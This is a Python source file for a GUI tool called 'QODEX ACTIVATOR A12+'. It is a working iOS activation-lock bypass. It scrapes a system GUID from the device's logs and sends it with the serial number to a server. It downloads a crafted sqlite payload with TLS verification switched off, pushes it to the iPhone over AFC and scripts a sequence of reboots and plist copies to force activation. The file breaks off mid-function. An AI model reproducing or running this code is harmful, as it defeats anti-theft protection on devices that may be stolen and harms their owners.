import sys
import os
import time
import subprocess
import re
import shutil
import sqlite3
import atexit
import urllib.parse
import json
import threading
import tkinter as tk
import binascii
from collections import Counter
from tkinter import simpledialog, messagebox

class Style:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'


class BypassAutomation:
    def __init__(self, log_callback=None):
        # --- Fix for libimobiledevice path ---
        script_dir = os.path.dirname(os.path.abspath(__file__))
        # Assuming client/main.py, so project root is one level up.
        project_root = os.path.dirname(script_dir)
        self.tools_dir = os.path.join(project_root, "libimobiledevice")

        self.pymobiledevice3_cmd = self._get_cmd_path("pymobiledevice3")
        self.ideviceinfo_cmd = self._get_cmd_path("ideviceinfo")
        self.idevicediagnostics_cmd = self._get_cmd_path("idevicediagnostics")
        self.ifuse_cmd = self._get_cmd_path("ifuse")
        self.curl_cmd = self._get_cmd_path("curl")
        # --- End of fix ---

        # NOTE: r1nderpest.py uses http (not https) and a specific IP/domain. 
        # Using the URL from the original main.py, but ensure your server is reachable.
        self.api_url = "http://192.168.1.3:8000/get2.php" 
        self.timeouts = {
            'asset_wait': 300,
            'asset_delete_delay': 15,
            'reboot_wait': 300,
            'syslog_collect': 180
        }
        self.mount_point = os.path.join(os.path.expanduser("~"), f".ifuse_mount_{os.getpid()}")
        self.afc_mode = None
        self.device_info = {}
        self.guid = None
        self.attempt_count = 0
        self.max_attempts = 15
        self.log_callback = log_callback
        atexit.register(self._cleanup)

    def _get_cmd_path(self, cmd_name):
        # 1. Prefer local executable in project's libimobiledevice folder
        local_path = os.path.join(self.tools_dir, f"{cmd_name}.exe")
        if os.path.exists(local_path):
            return local_path
        
        # 2. Look in the current Python environment's Scripts folder
        # This fixes the issue where pymobiledevice3 is installed but not in system PATH
        if os.name == 'nt': # Windows
            python_scripts = os.path.join(sys.prefix, 'Scripts')
            script_path = os.path.join(python_scripts, f"{cmd_name}.exe")
            if os.path.exists(script_path):
                return script_path
        
        # 3. Fallback to system PATH
        system_path = shutil.which(cmd_name)
        if system_path:
            return system_path
            
        return cmd_name # Return name and hope for the best

    def log(self, msg, level='info'):
        if self.log_callback:
            self.log_callback(msg, level)
        else:
            if level == 'info':
                print(f"{Style.GREEN}[✓]{Style.RESET} {msg}")
            elif level == 'error':
                print(f"{Style.RED}[✗]{Style.RESET} {msg}")
            elif level == 'warn':
                print(f"{Style.YELLOW}[⚠]{Style.RESET} {msg}")
            elif level == 'step':
                print(f"\n{Style.BOLD}{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
                print(f"{Style.BOLD}{Style.BLUE}▶{Style.RESET} {Style.BOLD}{msg}{Style.RESET}")
                print(f"{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
            elif level == 'detail':
                print(f"{Style.DIM}  ╰─▶{Style.RESET} {msg}")
            elif level == 'success':
                print(f"{Style.GREEN}{Style.BOLD}[✓ SUCCESS]{Style.RESET} {msg}")
            elif level == 'attempt':
                print(f"{Style.CYAN}[🔄 Attempt {self.attempt_count}/{self.max_attempts}]{Style.RESET} {msg}")

    def _run_cmd(self, cmd, timeout=None):
        try:
            # On Windows, we need to be careful with subprocess if cmd[0] is not absolute and not in PATH
            # But _get_cmd_path handles absolute paths now.
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return res.returncode, res.stdout.strip(), res.stderr.strip()
        except subprocess.TimeoutExpired:
            return 124, "", "Timeout"
        except Exception as e:
            return 1, "", str(e)

    def reboot_device(self):
        """Reboots device and waits for readiness"""
        self.log("Rebooting device...", "step")
        
        # Try using pymobiledevice3 for reboot
        code, _, err = self._run_cmd([self.pymobiledevice3_cmd, "restart"])
        if code != 0:
            # Fallback to idevicediagnostics
            code, _, err = self._run_cmd([self.idevicediagnostics_cmd, "restart"])
            if code != 0 and self.log_callback: # Avoid blocking command-line usage
                self.log(f"Soft reboot failed: {err}", "warn")
                self.log("Please reboot device manually and press Enter to continue...", "warn")
                # Using messagebox for GUI instead of input()
                if root_for_dialogs:
                    messagebox.showinfo("Manual Reboot Required", "Soft reboot failed.\nPlease reboot the device manually, wait for it to turn on, and then click OK.")
                else:
                    input()
                return True
        
        self.log("Device reboot command sent, waiting for reconnect...", "info")
        
        # Wait for device reboot
        for i in range(60):  # 60 attempts × 5 seconds = 5 minutes
            time.sleep(5)
            code, _, _ = self._run_cmd([self.ideviceinfo_cmd], timeout=5)
            if code == 0:
                self.log(f"Device reconnected after {i * 5} seconds", "success")
                # Give device extra time for full boot
                time.sleep(10)
                return True
            
            if i % 6 == 0:  # Every 30 seconds
                self.log(f"Still waiting for device... ({i * 5} seconds)", "detail")
        
        self.log("Device did not reconnect in time", "error")
        return False

    def verify_dependencies(self):
        self.log("Verifying System Requirements...", "step")
        # Check if ifuse is available
        if os.path.exists(self.ifuse_cmd) or shutil.which("ifuse"):
            self.afc_mode = "ifuse"
        else:
            self.afc_mode = "pymobiledevice3"
        
        self.log(f"AFC Transfer Mode: {self.afc_mode}", "info")
        self.log(f"Using pymobiledevice3 at: {self.pymobiledevice3_cmd}", "detail")

    def mount_afc(self):
        if self.afc_mode != "ifuse":
            return True
        os.makedirs(self.mount_point, exist_ok=True)
        code, out, _ = self._run_cmd(["mount"])
        if self.mount_point in out:
            return True
        for i in range(5):
            code, _, _ = self._run_cmd([self.ifuse_cmd, self.mount_point])
            if code == 0:
                return True
            time.sleep(2)
        self.log("Failed to mount via ifuse", "error")
        return False

    def unmount_afc(self):
        if self.afc_mode == "ifuse" and os.path.exists(self.mount_point):
            self._run_cmd(["umount", self.mount_point])
            try:
                os.rmdir(self.mount_point)
            except OSError:
                pass

    def _cleanup(self):
        """Ensure cleanup on exit"""
        self.unmount_afc()

    def afc_file_exists(self, remote_path):
        """Check if a file exists on the device via AFC."""
        self.log(f"Checking for file: {remote_path}", "detail")
        code, out, err = self._run_cmd([self.pymobiledevice3_cmd, "afc", "ls", remote_path])
        return code == 0 and "No such file or directory" not in err

    def afc_get_file_size(self, remote_path):
        """Gets the size of a remote file via AFC."""
        code, out, err = self._run_cmd([self.pymobiledevice3_cmd, "afc", "stat", remote_path])
        if code == 0 and "st_size" in out:
            try:
                return int(out.split("'st_size': ")[1].split(',')[0])
            except:
                return -1
        return -1

    def afc_pull(self, remote_path, local_path):
        """Pull a file from the device."""
        self.log(f"Pulling {remote_path} to {local_path}", "detail")
        if os.path.exists(local_path):
            os.remove(local_path)
        code, _, err = self._run_cmd([self.pymobiledevice3_cmd, "afc", "pull", remote_path, local_path])
        if code != 0:
            raise Exception(f"AFC pull failed for {remote_path}: {err}")
        if not os.path.exists(local_path):
            raise Exception(f"AFC pull failed: local file {local_path} not created.")
        self.log(f"Successfully pulled {os.path.basename(remote_path)}", "info")

    def afc_copy(self, src_path, dst_path):
        """Copies a file from one remote location to another."""
        self.log(f"Copying {src_path} -> {dst_path}", "detail")
        temp_local_path = f"temp_copy_{os.getpid()}.tmp"
        try:
            # 1. Pull from source
            self.afc_pull(src_path, temp_local_path)
            
            # Check if pull was successful and file is not empty
            if not os.path.exists(temp_local_path) or os.path.getsize(temp_local_path) == 0:
                self.log(f"Source file {src_path} is missing or empty. Skipping copy.", "warn")
                return False

            # 2. Push to destination
            self.afc_push(temp_local_path, dst_path)
            self.log(f"Successfully copied {src_path} to {dst_path}", "success")
            return True
        except Exception as e:
            self.log(f"AFC copy failed: {e}", "warn")
            return False
        finally:
            if os.path.exists(temp_local_path):
                os.remove(temp_local_path)

    def afc_push(self, local_path, remote_path):
        """Push a file to the device."""
        self.log(f"Pushing {local_path} to {remote_path}", "detail")
        code, _, err = self._run_cmd([self.pymobiledevice3_cmd, "afc", "push", local_path, remote_path])
        if code != 0:
            raise Exception(f"AFC push failed for {local_path}: {err}")
        self.log(f"Successfully pushed {os.path.basename(local_path)}", "info")

    def detect_device(self):
        self.log("Detecting Device...", "step")
        code, out, err = self._run_cmd([self.ideviceinfo_cmd])
        if code != 0:
            self.log(f"Device not found. Error: {err or 'Unknown'}", "error")
            # Don't sys.exit(1) here in a GUI app, just raise exception
            raise Exception("Device not found. Please connect your device.")
        
        info = {}
        for line in out.splitlines():
            if ": " in line:
                key, val = line.split(": ", 1)
                info[key.strip()] = val.strip()
        self.device_info = info
        
        print(f"\n{Style.BOLD}Device: {info.get('ProductType','Unknown')} (iOS {info.get('ProductVersion','?')}){Style.RESET}")
        print(f"UDID: {info.get('UniqueDeviceID','?')}")
        
        if info.get('ActivationState') == 'Activated':
            print(f"{Style.YELLOW}Warning: Device already activated.{Style.RESET}")

    def parse_tracev3_structure(self, data):
        """Parses tracev3 file structure for more precise search"""
        signatures = []
        
        # Search for database-related strings
        db_patterns = [
            b'BLDatabaseManager',
            b'BLDatabase',
            b'BLDatabaseManager.sqlite', 
            b'bookassetd [Database]: Store is at file:///private/var/containers/Shared/SystemGroup',
        ]
        
        for pattern in db_patterns:
            pos = 0
            while True:
                pos = data.find(pattern, pos)
                if pos == -1:
                    break
                signatures.append(('string', pattern, pos))
                pos += len(pattern)
        
        return signatures

    def extract_guid_candidates(self, data, context_pos, window_size=512):
        """Extracts GUIDs with contextual analysis"""
        candidates = []
        
        # Extended GUID pattern
        guid_pattern = re.compile(
            rb'([0-9A-F]{8}[-][0-9A-F]{4}[-][0-9A-F]{4}[-][0-9A-F]{4}[-][0-9A-F]{12})',
            re.IGNORECASE
        )
        
        # Search in context window
        start = max(0, context_pos - window_size)
        end = min(len(data), context_pos + window_size)
        context_data = data[start:end]
        
        # GUID search
        for match in guid_pattern.finditer(context_data):
            guid = match.group(1).decode('ascii').upper()
            relative_pos = match.start() + start - context_pos
            
            # Extended GUID validation
            if self.validate_guid_structure(guid):
                candidates.append({
                    'guid': guid,
                    'position': relative_pos,
                    'context': self.get_context_string(context_data, match.start(), match.end())
                })
        
        return candidates

    def validate_guid_structure(self, guid):
        """Extended GUID structure validation"""
        try:
            # Check GUID version (RFC 4122)
            parts = guid.split('-')
            if len(parts) != 5:
                return False
            
            # Check part lengths
            if len(parts[0]) != 8 or len(parts[1]) != 4 or len(parts[2]) != 4 or len(parts[3]) != 4 or len(parts[4]) != 12:
                return False
            
            # Check hex characters
            hex_chars = set('0123456789ABCDEF')
            clean_guid = guid.replace('-', '')
            if not all(c in hex_chars for c in clean_guid):
                return False
            
            # Check version (4th character of 3rd group should be 4)
            version_char = parts[2][0]
            if version_char not in '4':
                return False  # iOS commonly uses version 4
            
            # Check variant (8,9,A,B - 2 high bits)
            variant_char = parts[3][0]
            if variant_char not in '89AB':
                return False
            
            return True
            
        except Exception:
            return False

    def get_context_string(self, data, start, end, context_size=50):
        """Gets context string around GUID"""
        context_start = max(0, start - context_size)
        context_end = min(len(data), end + context_size)
        
        context = data[context_start:context_end]
        try:
            # Try to decode as text
            return context.decode('utf-8', errors='replace')
        except:
            # For binary data show hex
            return binascii.hexlify(context).decode('ascii')

    def analyze_guid_confidence(self, guid_candidates):
        """Analyzes confidence in found GUIDs"""
        if not guid_candidates:
            return None
        
        # Group by GUID
        guid_counts = Counter(candidate['guid'] for candidate in guid_candidates)
        
        # Calculate score for each GUID
        scored_guids = []
        for guid, count in guid_counts.items():
            score = count * 10  # Base score by occurrence count
            
            # Additional confidence factors
            positions = [c['position'] for c in guid_candidates if c['guid'] == guid]
            
            # Preference for GUIDs close to BLDatabaseManager
            close_positions = [p for p in positions if abs(p) < 100]
            if close_positions:
                score += len(close_positions) * 5
            
            # Preference for GUIDs before BLDatabaseManager (more common in logs)
            before_positions = [p for p in positions if p < 0]
            if before_positions:
                score += len(before_positions) * 3
            
            scored_guids.append((guid, score, count))
        
        # Sort by score
        scored_guids.sort(key=lambda x: x[1], reverse=True)
        return scored_guids

    def confirm_guid_manual(self, guid):
        """Requests manual confirmation for low-confidence GUID"""
        # --- FIX: Match r1nderpest.py behavior (Always accept) ---
        self.log(f"GUID Detected: {guid}", "success")
        return True
        # ---------------------------------------------------------

    def get_guid_enhanced(self):
        """Enhanced GUID extraction version"""
        self.attempt_count += 1
        self.log(f"GUID search attempt {self.attempt_count}/{self.max_attempts}", "attempt")
        
        udid = self.device_info.get('UniqueDeviceID')
        if not udid:
            self.log("UDID not found, cannot collect logs.", "error")
            return None

        log_path = f"{udid}.logarchive"
        
        try:
            # Collect logs
            self.log("Collecting device logs...", "detail")
            # Ensure we use the correct command path
            code, _, err = self._run_cmd([self.pymobiledevice3_cmd, "syslog", "collect", log_path], timeout=120)
            if code != 0:
                self.log(f"Log collection failed: {err}", "error")
                return None
            
            trace_file = os.path.join(log_path, "logdata.LiveData.tracev3")
            if not os.path.exists(trace_file):
                self.log("tracev3 file not found", "error")
                return None
            
            # Read and analyze file
            with open(trace_file, 'rb') as f:
                data = f.read()
            
            size_mb = len(data) / (1024 * 1024)
            self.log(f"Analyzing tracev3 ({size_mb:.1f} MB)...", "detail")
            
            # Search for key structures
            signatures = self.parse_tracev3_structure(data)
            self.log(f"Found {len(signatures)} relevant signatures", "detail")
            
            # Collect GUID candidates
            all_candidates = []
            bl_database_positions = []
            
            for sig_type, pattern, pos in signatures:
                if pattern == b'BLDatabaseManager':
                    bl_database_positions.append(pos)
                    candidates = self.extract_guid_candidates(data, pos)
                    all_candidates.extend(candidates)
                    
                    if candidates:
                        self.log(f"Found {len(candidates)} GUID candidates near BLDatabaseManager at 0x{pos:x}", "detail")
            
            if not all_candidates:
                self.log("No valid GUID candidates found", "error")
                return None
            
            # Confidence analysis
            scored_guids = self.analyze_guid_confidence(all_candidates)
            if not scored_guids:
                return None
            
            # Log results
            self.log("GUID confidence analysis:", "info")
            for guid, score, count in scored_guids[:5]:
                self.log(f"  {guid}: score={score}, occurrences={count}", "detail")
            
            best_guid, best_score, best_count = scored_guids[0]
            
            # Determine confidence level
            if best_score >= 30:
                self.log(f"✅ HIGH CONFIDENCE: {best_guid} (score: {best_score})", "success")
            elif best_score >= 15:
                self.log(f"⚠️ MEDIUM CONFIDENCE: {best_guid} (score: {best_score})", "warn")
            else:
                self.log(f"⚠️ LOW CONFIDENCE: {best_guid} (score: {best_score})", "warn")
            
            # Match r1nderpest behavior: always return the best GUID found
            return best_guid
            
        finally:
            # Cleanup
            if os.path.exists(log_path):
                try:
                    shutil.rmtree(log_path)
                except Exception as e:
                    self.log(f"Warning: Could not cleanup logs: {e}", "warn")

    def get_guid_auto_with_retry(self):
        """Auto-detect GUID with reboot retry mechanism"""
        self.attempt_count = 0
        
        while self.attempt_count < self.max_attempts:
            guid = self.get_guid_enhanced()
            
            if guid:
                return guid
            
            # If not last attempt - reboot device
            if self.attempt_count < self.max_attempts:
                self.log(f"GUID not found in attempt {self.attempt_count}. Rebooting device and retrying...", "warn")
                
                if not self.reboot_device():
                    self.log("Failed to reboot device, continuing anyway...", "warn")
                
                # After reboot re-detect device
                self.log("Re-detecting device after reboot...", "detail")
                self.detect_device()
                
                # Small pause before next attempt
                time.sleep(5)
            else:
                self.log(f"All {self.max_attempts} attempts exhausted", "error")
        
        return None

    def get_guid_auto(self):
        """Auto-detect GUID using enhanced method with retry"""
        return self.get_guid_auto_with_retry()

    def get_all_urls_from_server(self, prd, guid, sn):
        """Requests all three URLs (stage1, stage2, stage3) from the server"""
        params = urllib.parse.urlencode({'prd': prd, 'guid': guid, 'sn': sn})
        url = f"{self.api_url}?{params}"

        self.log(f"Requesting all URLs from server: {url}", "detail")
        
        # --- FIX: Match r1nderpest.py behavior (add -k for SSL bypass) ---
        code, out, err = self._run_cmd([self.curl_cmd, "-s", "-k", url])
        if code != 0:
            self.log(f"Server request failed: {err}", "error")
            return None, None, None

        try:
            data = json.loads(out)
            if data.get('success'):
                stage1_url = data['links']['step1_fixedfile']
                stage2_url = data['links']['step2_bldatabase']
                stage3_url = data['links']['step3_final']
                return stage1_url, stage2_url, stage3_url
            else:
                self.log("Server returned error response", "error")
                return None, None, None
        except json.JSONDecodeError:
            self.log("Server did not return valid JSON", "error")
            return None, None, None

    def run_activation_flow(self):
        """Main activation flow designed to be called from UI"""
        self.verify_dependencies()
        self.detect_device()

        self.log("Starting auto-detection for GUID...", "step")
        self.guid = self.get_guid_auto()
        if self.guid:
            self.log(f"Auto-detected GUID after {self.attempt_count} attempt(s): {self.guid}", "success")
        else: # Fallback to manual input
            self.log(f"Could not auto-detect GUID after {self.attempt_count} attempts.", "warn")
            self.log("Please enter the GUID manually.", "step")
            
            manual_guid = simpledialog.askstring(
                "Manual GUID Input",
                "Automatic GUID detection failed.\nPlease enter the SystemGroup GUID manually:",
                parent=root_for_dialogs
            )

            if manual_guid and self.validate_guid_structure(manual_guid.strip().upper()):
                self.guid = manual_guid.strip().upper()
                self.log(f"Using manually entered GUID: {self.guid}", "info")
            else:
                self.log("No valid manual GUID provided. Aborting.", "error")
                raise Exception("Manual GUID entry was cancelled or invalid.")
        
        # Only ask if specifically needed, otherwise trust the auto-detect
        # if not messagebox.askyesno("Confirm GUID", f"The following GUID will be used:\n\n{self.guid}\n\nDo you want to proceed?", parent=root_for_dialogs):
        #    raise Exception("Payload deployment cancelled by user.")

        self.log("Requesting All Payload Stages from Server...", "step")
        prd = self.device_info['ProductType']
        sn = self.device_info['SerialNumber']
        
        stage1_url, stage2_url, stage3_url = self.get_all_urls_from_server(prd, self.guid, sn)
        
        if not stage1_url or not stage2_url or not stage3_url:
            self.log("Failed to get URLs from server", "error")
            raise Exception("Failed to get all URLs from server.")
        
        self.log(f"Stage1 URL: {stage1_url}", "detail")
        self.log(f"Stage2 URL: {stage2_url}", "detail")
        self.log(f"Stage3 URL: {stage3_url}", "detail")

        self.log("Pre-warming server endpoints...", "step")
        stages = [
            ("stage1", stage1_url),
            ("stage2", stage2_url), 
            ("stage3", stage3_url)
        ]
        
        for stage_name, stage_url in stages:
            self.log(f"Warming up: {stage_name}...", "detail")
            # --- FIX: Added -k for SSL bypass ---
            code, http_code, _ = self._run_cmd([self.curl_cmd, "-s", "-k", "-o", "nul" if os.name == 'nt' else "/dev/null", "-w", "%{http_code}", stage_url])
            if http_code != "200":
                self.log(f"Warning: Failed to warm up {stage_name} (HTTP {http_code})", "warn")
            else:
                self.log(f"Successfully warmed up {stage_name}", "info")
            time.sleep(1)

        self.log("Downloading final payload...", "step")
        local_db = "downloads.28.sqlitedb"
        if os.path.exists(local_db):
            os.remove(local_db)
        
        # --- FIX: Added -k for SSL bypass ---
        code, _, err = self._run_cmd([self.curl_cmd, "-L", "-k", "-o", local_db, stage3_url])
        if code != 0:
            self.log(f"Download failed: {err}", "error")
            raise Exception(f"Download failed: {err}")

        # Validate database
        self.log("Validating payload database...", "detail")
        conn = sqlite3.connect(local_db)
        try:
            res = conn.execute("SELECT count(*) FROM sqlite_master WHERE type='table' AND name='asset'")
            if res.fetchone()[0] == 0:
                raise Exception("Invalid DB - no asset table found")
            
            res = conn.execute("SELECT COUNT(*) FROM asset")
            count = res.fetchone()[0]
            if count == 0:
                raise Exception("Invalid DB - no records in asset table")
                
            self.log(f"Database validation passed - {count} records found", "info")
            
            res = conn.execute("SELECT pid, url, local_path FROM asset")
            for row in res.fetchall():
                self.log(f"Record {row[0]}: {row[1]} -&gt; {row[2]}", "detail")
                
        except Exception as e:
            self.log(f"Invalid payload received: {e}", "error")
            raise Exception(f"Invalid payload received: {e}")
        finally:
            conn.close()
        
        self.log("Uploading Payload via AFC...", "step")
        target = "/Downloads/downloads.28.sqlitedb"
        
        if self.afc_mode == "ifuse":
            if not self.mount_afc():
                self.log("Mounting failed — falling back to pymobiledevice3", "warn")
                self.afc_mode = "pymobiledevice3"
        
        if self.afc_mode == "ifuse":
            fpath = self.mount_point + target
            if os.path.exists(fpath):
                os.remove(fpath)
            shutil.copy(local_db, fpath)
            self.log("Uploaded via ifuse", "info")
        else:
            self._run_cmd([self.pymobiledevice3_cmd, "afc", "rm", target])
            code, _, err = self._run_cmd([self.pymobiledevice3_cmd, "afc", "push", local_db, target])
            if code != 0:
                self.log(f"AFC upload failed: {err}", "error")
                sys.exit(1)
            self.log("Uploaded via pymobiledevice3", "info")
            
        self.log("✅ Payload Deployed. Starting automated activation sequence...", "success")

        # --- Important: Delete journal files before reboot ---
        self.log("Cleaning up database journal files before reboot...", "step")
        db_shm = "/Downloads/downloads.28.sqlitedb-shm"
        db_wal = "/Downloads/downloads.28.sqlitedb-wal"
        self._run_cmd([self.pymobiledevice3_cmd, "afc", "rm", db_shm])
        self._run_cmd([self.pymobiledevice3_cmd, "afc", "rm", db_wal])
        self.log("Journal files cleaned up.", "info")

        # --- Automation of manual steps ---

        # === STAGE 1: First Reboot + Copy to /Books/ ===
        self.log("STAGE 1: First reboot + copy to /Books/...", "step")
        if not self.reboot_device():
            self.log("First reboot failed, but continuing process...", "warn")

        self.log("Waiting for iTunesMetadata.plist to be generated (min 1KB)...", "step")
        source_plist = "/iTunes_Control/iTunes/iTunesMetadata.plist"
        dest_plist = "/Books/iTunesMetadata.plist"
        
        metadata_valid = False
        for i in range(24):  # Wait up to 2 minutes
            self.log(f"Checking for metadata file... (Attempt {i+1}/24)", "detail")
            file_size = self.afc_get_file_size(source_plist)
            if file_size >= 1024:
                self.log(f"Metadata file is valid (size: {file_size} bytes)!", "success")
                metadata_valid = True
                break
            self.log(f"Metadata file not ready (size: {file_size} bytes). Waiting...", "detail")
            time.sleep(5)

        if metadata_valid:
            if self.afc_copy(source_plist, dest_plist):
                self.log("Stage 1 copy successful.", "info")
        else:
            self.log("Stage 1 copy from /iTunes_Control/iTunes/ failed or was skipped (file not found).", "warn")

        # === STAGE 2: Second Reboot + Copy Back ===
        self.log("STAGE 2: Second reboot + copy back to /iTunes_Control/...", "step")
        if not self.reboot_device():
            self.log("Second reboot failed, but continuing process...", "warn")

        if self.afc_copy(dest_plist, source_plist):
            self.log("Stage 2 copy-back successful.", "info")
        else:
            self.log("Stage 2 copy-back from /Books/ failed or was skipped (file not found).", "warn")

        self.log("Waiting for bookassetd to process the plist and create the .epub asset...", "step")
        epub_found = False
        for i in range(24): # Wait up to 2 minutes
            self.log(f"Checking for .epub asset... (Attempt {i+1}/24)", "detail")
            code, out, err = self._run_cmd([self.pymobiledevice3_cmd, "afc", "ls", "/Books/Purchases/"])
            if code == 0 and ".epub" in out:
                epub_file = [line for line in out.splitlines() if line.endswith('.epub')][0]
                self.log(f"Found asset: {epub_file}", "success")
                epub_found = True
                break
            time.sleep(5)

        if epub_found:
            self.log("Performing final metadata copy to lock in activation state...", "step")
            self.afc_copy(dest_plist, source_plist)
        else:
            self.log("Timeout waiting for .epub asset. The final reboot will proceed, but activation may fail.", "warn")

        # === FINAL REBOOT ===
        self.log("Performing final reboot to trigger activation...", "step")
        if not self.reboot_device():
            self.log("Device did not reconnect after final reboot. This may be okay.", "warn")

        final_message = (
            "✅ Activation Process Automated!\n\n"
            "The device has been rebooted for the final time. It should now proceed to the Home Screen upon startup.\n\n"
            f"Used GUID: {self.guid}"
        )
        self.log("🎉 PROCESS COMPLETE! Device should activate on its own.", "success")
        messagebox.showinfo("Payload Deployed", final_message, parent=root_for_dialogs)


class ModernApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("QODEX ACTIVATOR A12+")
        self.geometry("900x600")
        self.configure(bg="#0a0a0a")
        self.resizable(False, False)
        
        ws = self.winfo_screenwidth()
        hs = self.winfo_screenheight()
        x = (ws - 900) // 2
        y = (hs - 600) // 2
        self.geometry(f"900x600+{x}+{y}")

        global root_for_dialogs
        root_for_dialogs = self

        self.backend = BypassAutomation(log_callback=self.update_status)
        
        self._create_ui()
        self.after(1000, self.auto_refresh_device_info)

    def _create_ui(self):
        header = tk.Frame(self, bg="#1a1a1a", height=80)
        header.pack(fill="x", padx=0, pady=0)
        header.pack_propagate(False)
        
        tk.Label(header, text="⚡ QODEX ACTIVATOR A12+", bg="#1a1a1a", 
                fg="#00ffff", font=("Consolas", 22, "bold")).pack(side="left", padx=30, pady=15)
        
        self.status_badge = tk.Label(header, text="Waiting for device...", bg="#1a1a1a", 
                fg="#ff4444", font=("Consolas", 10, "bold"))
        self.status_badge.pack(side="right", padx=30)
        
        content = tk.Frame(self, bg="#0a0a0a")
        content.pack(fill="both", expand=True, padx=20, pady=20)
        
        left_panel = tk.Frame(content, bg="#0a0a0a")
        left_panel.pack(side="left", fill="y", padx=(0, 10), anchor='n')
        
        tk.Label(left_panel, text="📱 Device Information", bg="#0a0a0a", 
                fg="#00ffff", font=("Consolas", 12, "bold")).pack(anchor="w", pady=(0, 15))
        
        info_box = tk.Frame(left_panel, bg="#1a1a1a", relief="flat", bd=1)
        info_box.pack(fill="x")
        
        self.labels = {}
        fields = ["Model", "Product Type", "iOS Version", "Serial Number", "UDID", "Activation State"]
        for i, k in enumerate(fields):
            if i > 0:
                sep = tk.Canvas(info_box, bg="#1a1a1a", height=1, highlightthickness=0)
                sep.pack(fill="x", padx=15)
                sep.create_line(0, 0, 400, 0, fill="#333333")
            
            row = tk.Frame(info_box, bg="#1a1a1a")
            row.pack(fill="x", padx=20, pady=10)
            
            tk.Label(row, text=f"{k}:", bg="#1a1a1a", fg="#888888",
                    font=("Consolas", 10), width=15, anchor="w").pack(side="left")
            
            l = tk.Label(row, text="N/A", bg="#1a1a1a", fg="#cccccc", 
                        font=("Consolas", 10, "bold"), anchor="w", wraplength=250, justify="left")
            l.pack(side="left", padx=10, fill="x", expand=True)
            self.labels[k] = l

        right_panel = tk.Frame(content, bg="#0a0a0a")
        right_panel.pack(side="right", fill="both", expand=True, padx=(10, 0))

        tk.Label(right_panel, text="⚙️ Activation Control", bg="#0a0a0a", 
                fg="#00ffff", font=("Consolas", 12, "bold")).pack(anchor="w", pady=(0, 15))

        button_frame = tk.Frame(right_panel, bg="#0a0a0a")
        button_frame.pack(fill="x", pady=10)

        self.activate_btn = tk.Button(button_frame, text="Activate", command=self.on_activate, font=("Consolas", 12, "bold"), bg="#005555", fg="white", relief="flat", padx=15, pady=12, state=tk.DISABLED)
        self.activate_btn.pack(expand=True, fill="x", padx=5)

        status_box = tk.Frame(right_panel, bg="#1a1a1a")
        status_box.pack(fill="both", expand=True, pady=(10,0))
        
        self.status_text = tk.Text(status_box, bg="#1a1a1a", fg="#999999", font=("Consolas", 9), relief="flat", bd=0, wrap="word", height=10)
        self.status_text.pack(fill="both", expand=True, padx=15, pady=15)
        self.status_text.insert("end", "Welcome to QODEX Activator.\nPlease connect your device.")
        self.status_text.config(state=tk.DISABLED)

        self.status_text.tag_config('info', foreground='#ffffff')
        self.status_text.tag_config('error', foreground='#ff4444')
        self.status_text.tag_config('success', foreground='#00ff00')
        self.status_text.tag_config('detail', foreground='#888888')
        self.status_text.tag_config('step', foreground='#00ffff', font=("Consolas", 10, "bold"))
        self.status_text.tag_config('warn', foreground='#ffaa00')
        self.status_text.tag_config('attempt', foreground='#00ffff')

    def update_status(self, msg, level):
        self.status_text.config(state=tk.NORMAL)
        self.status_text.insert("end", f"{msg}\n", level)
        self.status_text.see("end")
        self.status_text.config(state=tk.DISABLED)
        self.update_idletasks()

    def auto_refresh_device_info(self):
        info = self.backend.device_info
        _, out, _ = self.backend._run_cmd([self.backend.ideviceinfo_cmd])
        if out:
            new_info = {}
            for line in out.splitlines():
                if ": " in line:
                    key, val = line.split(": ", 1)
                    new_info[key.strip()] = val.strip()
            self.backend.device_info = new_info
            
            product_type = new_info.get('ProductType', 'N/A')

            # --- Fix for model name ---
            device_map = {
                # iPhone
                'iPhone11,2': 'iPhone XS',
                'iPhone11,4': 'iPhone XS Max',
                'iPhone11,6': 'iPhone XS Max',
                'iPhone11,8': 'iPhone XR',
                'iPhone12,1': 'iPhone 11',
                'iPhone12,3': 'iPhone 11 Pro',
                'iPhone12,5': 'iPhone 11 Pro Max',
                'iPhone13,1': 'iPhone 12 mini',
                'iPhone13,2': 'iPhone 12',
                'iPhone13,3': 'iPhone 12 Pro',
                'iPhone13,4': 'iPhone 12 Pro Max',
                'iPhone14,4': 'iPhone 13 mini',
                'iPhone14,5': 'iPhone 13',
                'iPhone14,2': 'iPhone 13 Pro',
                'iPhone14,3': 'iPhone 13 Pro Max',
                'iPhone14,6': 'iPhone SE (3rd gen)',
                # iPad
                'iPad11,1': 'iPad mini 5 (WiFi)',
                'iPad11,2': 'iPad mini 5 (Cellular)',
                'iPad11,6': 'iPad 8th gen (WiFi)',
                'iPad11,7': 'iPad 8th gen (Cellular)',
                'iPad13,1': 'iPad Air 4 (WiFi)',
                'iPad13,2': 'iPad Air 4 (Cellular)',
                'iPad14,1': 'iPad mini 6 (WiFi)',
                'iPad14,2': 'iPad mini 6 (Cellular)',
            }
            model_name = device_map.get(product_type, product_type)
            # --- End of fix ---

            self.labels["Model"].config(text=model_name)
            self.labels["Product Type"].config(text=product_type)
            self.labels["iOS Version"].config(text=new_info.get('ProductVersion', 'N/A'))
            self.labels["Serial Number"].config(text=new_info.get('SerialNumber', 'N/A'))
            self.labels["UDID"].config(text=new_info.get('UniqueDeviceID', 'N/A'))
            self.labels["Activation State"].config(text=new_info.get('ActivationState', 'N/A'))
            
            self.status_badge.config(text="● Connected", fg="#00ff00")
            self.activate_btn.config(state=tk.NORMAL)
        else:
            self.backend.device_info = {}
            for label in self.labels.values():
                label.config(text="N/A")
            self.status_badge.config(text="● Disconnected", fg="#ff4444")
            self.activate_btn.config(state=tk.DISABLED)
            
        self.after(3000, self.auto_refresh_device_info)

    def on_activate(self):
        self.activate_btn.config(state=tk.DISABLED)
        self.status_text.config(state=tk.NORMAL)
        self.status_text.delete('1.0', tk.END)
        self.status_text.config(state=tk.DISABLED)

        thread = threading.Thread(target=self.run_process_thread, daemon=True)
        thread.start()

    def run_process_thread(self):
        try:
